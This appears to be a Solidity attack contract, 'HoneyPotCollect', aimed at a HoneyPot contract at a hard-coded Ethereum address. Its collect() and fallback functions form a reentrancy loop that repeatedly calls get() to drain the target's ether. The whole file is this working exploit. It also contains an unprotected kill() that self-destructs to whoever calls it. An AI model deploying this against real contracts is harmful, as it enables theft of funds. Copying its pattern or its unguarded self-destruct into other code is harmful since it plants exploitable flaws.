pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {

  HoneyPot public honeypot;
  
  function HoneyPotCollect () {
    honeypot = HoneyPot(0xe5a59bE02cadb433E4a4bE5463ce7dA2404907C6);
  }
  
  function kill () {
    suicide(msg.sender);
  }
  
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  
  }
}